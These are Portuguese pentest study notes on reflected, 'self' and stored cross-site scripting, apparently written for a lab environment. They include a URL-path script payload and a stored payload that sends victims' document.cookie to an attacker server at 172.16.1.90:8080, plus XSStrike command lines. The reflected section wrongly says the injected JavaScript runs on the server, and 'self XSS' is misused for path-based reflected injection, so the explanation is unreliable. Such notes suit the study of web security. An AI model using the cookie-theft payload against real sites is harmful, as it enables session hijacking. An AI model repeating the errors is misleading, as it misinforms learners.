## Reflected 
Usando o mesmo conceito de injeção de HTML, também é possível injetar código JavaScript no servidor para executar código no servidor. O XSS refletido ocorre porque o invasor cria uma URL maliciosa e precisa enviá-la à vítima, sem que nenhuma gravação seja feita no banco de dados da página

## Self
Na URL, é possível colocar uma / para ver como a página se comporta, e possivelmente inserir código javascript pela URL, por exemplo: 172.16.1.10/turismo/procurar.php/"><script>alert(1)</script>

## Stored 
Quando o XSS é armazenado em algum lugar, por exemplo, comentários de feedback, é possível roubar cookies de outros usuários enviando-os para o próprio servidor, por exemplo: <script>new Image().src="http://172.16.1.90:8080/?="+document.cookie;</script>

### XSStrike
O XSStrike é uma ferramenta para automatizar os testes de XSS em um host
Para utilizar ele basta utilizar o comando `python3 xsstrike.py -u "host?parameter="` ou `python3 xsstrike.py -u "host" --params` para XSS Refletido e o comando `python3 xsstrike.py -u "host/" --path` para Self XSS

Link: https://github.com/s0md3v/XSStrike